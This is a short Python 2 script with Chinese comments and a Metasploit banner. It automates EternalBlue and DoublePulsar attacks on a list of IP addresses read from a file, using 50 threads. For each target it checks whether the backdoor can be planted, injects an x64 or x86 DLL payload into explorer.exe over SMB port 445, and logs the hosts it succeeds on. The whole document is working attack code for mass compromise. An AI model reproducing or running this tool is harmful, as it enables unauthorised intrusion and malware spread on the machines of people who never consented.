#coding:utf-8
import subprocess
import threading
import Queue,time
lock=threading.Lock()
writelock=threading.Lock()
queque=Queue.Queue()
threadNum=50     #线程数
connection=threading.BoundedSemaphore(threadNum)
def runFunc(func,args):
    proc=subprocess.Popen(func+args,shell=True,stdout=subprocess.PIPE)
    outStr,x = proc.communicate()
    return outStr
def finKey(outStr,finStr):
    if outStr.find(finStr)!=-1:
        return True
    else:
        return False
def attackThread(ip,log):
        lock.acquire()
        print '[+]testing the ip :'+ip.strip()
        lock.release()
        args = "--VerifyTarget True --VerifyBackdoor True --TargetIp " + ip.strip()
        outStr=runFunc("Eternalblue-2.2.0.exe ",args)
        if not finKey(outStr,'Backdoor returned code: 10 - Success'):
            connection.release()
            return
        lock.acquire()
        print '[+]IP: %s has the vun'%ip.strip()
        lock.release()
        arg = "--Function RunDll --TargetPort 445 --DllOrdinal 1 --NetworkTimeout 20 --Protocol SMB --ProcessName explorer.exe --TargetIp " +ip.strip()
        if finKey(outStr,'64-bit'):
            lock.acquire()
            print 'trying insrt x64.dll'
            lock.release()
            arg += " --Architecture x64 --DllPayload x64.dll "
        else:
            lock.acquire()
            print "[+]trying insert x86.dll in "+ip.strip()+'......'
            lock.release()
            arg += " --Architecture x86 --DllPayload x86.dll "
        outStr=runFunc("Doublepulsar-1.3.1.exe ",arg)
        if finKey(outStr,"Command completed successfully"):
            lock.acquire()
            print '[+]the %s insert success'+ip.strip()
            lock.release()
            writelock.acquire()
            log.write(ip+'\n')
            writelock.release()
        connection.release()
def main():
    print ''' 
		                         .                                         .
          .
         
               dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o
                '   dB'                     BBP
             dB'dB'dB' dBBP     dBP     dBP BB
            dB'dB'dB' dBP      dBP     dBP  BB
           dB'dB'dB' dBBBBP   dBP     dBBBBBBB

                                            dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP
                   .                  .                  dB' dBP    dB'.BP
                                      |       dBP    dBBBB' dBP    dB'.BP dBP    dBP
                                    --o--    dBP    dBP    dBP    dB'.BP dBP    dBP
                                      |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP

                                                                    .
                         .
                 o                  To boldly go where no
                                     shell has gone before

						
    '''
    log=open('f://log.txt','a')
    for ip in open('f://ips.txt','r'):
        connection.acquire()
        t=threading.Thread(target=attackThread,args=(ip,log)).start()
    #attackThread('192.168.1.22',log)
if __name__=='__main__':
    main()
